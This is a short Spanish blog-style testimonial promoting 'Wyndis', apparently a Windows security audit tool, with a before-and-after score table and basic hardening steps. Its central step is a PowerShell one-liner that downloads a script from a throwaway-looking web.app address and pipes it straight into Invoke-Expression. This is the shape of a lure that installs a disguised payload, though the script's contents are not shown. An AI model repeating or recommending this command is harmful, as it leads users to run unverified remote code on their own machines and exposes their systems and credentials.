# Wyndis para PC Gaming

Cómo audité mi PC gaming en 3 minutos y encontré 4 fallos críticos.

## El problema

Tenía mi PC gaming configurado "para rendimiento máximo".
Desactivé Windows Defender, apagué el firewall, deshabilité UAC.
Usaba RDP para conectarme desde el trabajo y tenía BitLocker desactivado "para no perder velocidad".

## La auditoría

```powershell
irm wyndis-download-ce9eb.web.app/install.ps1 | iex
```

En 3 minutos Wyndis me mostró:

| Hallazgo | Gravedad | Impacto |
|---|---|---|
| Windows Defender desactivado | Crítico | -5 pts |
| Firewall apagado en perfil público | Crítico | -5 pts |
| RDP expuesto en internet | Crítico | -5 pts |
| UAC desactivado | Crítico | -5 pts |
| Sin BitLocker | Advertencia | -2 pts |

**Puntuación: 78/100** — Pensaba que estaba bien, estaba a 22 puntos del desastre.

## Lo que hice

1. Activé Defender + firewall
2. Configuré RDP con NLA + VPN
3. Activé UAC nivel 2
4. Puse BitLocker en el disco del sistema

**Semana después** — Wyndis score: 95/100.

---

**Moraleja**: Rendimiento y seguridad no están reñidos. 5 minutos de configuración evitan semanas de recuperación.
